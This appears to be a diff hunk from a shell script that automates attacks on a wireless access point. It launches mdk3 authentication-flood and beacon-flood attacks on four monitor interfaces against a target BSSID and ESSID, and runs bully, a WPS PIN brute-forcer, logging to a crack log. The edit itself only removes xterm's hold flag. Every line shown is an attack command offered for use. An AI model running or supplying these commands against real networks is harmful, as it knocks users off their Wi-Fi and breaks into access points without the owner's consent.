@@ -77,13 +77,13 @@ rm /tmp/cracklog.txt >> /dev/null ;
 
 
 
-xterm -hold -e "timeout 2m mdk3 mon1 a -t "$bssid" -e "$essid"  -s 5000 " &
+xterm  -e "timeout 2m mdk3 mon1 a -t "$bssid" -e "$essid"  -s 5000 " &
 
-xterm -hold -e "timeout 2m mdk3 mon2 a -t "$bssid" -e "$essid"  -s 5000 " &
+xterm  -e "timeout 2m mdk3 mon2 a -t "$bssid" -e "$essid"  -s 5000 " &
 
-xterm -hold -e "timeout 2m mdk3 mon3 b -t "$bssid" -e "$essid" -s 5000" & 
+xterm  -e "timeout 2m mdk3 mon3 b -t "$bssid" -e "$essid" -s 5000" & 
 
-xterm -hold -e "timeout 2m mdk3 mon4 b -t "$bssid" -e "$essid" -s 5000" &
+xterm  -e "timeout 2m mdk3 mon4 b -t "$bssid" -e "$essid" -s 5000" &
 
 bully -b "$bssid" -A -C -D -F -c $channel  mon0 >> /tmp/cracklog.txt &
 
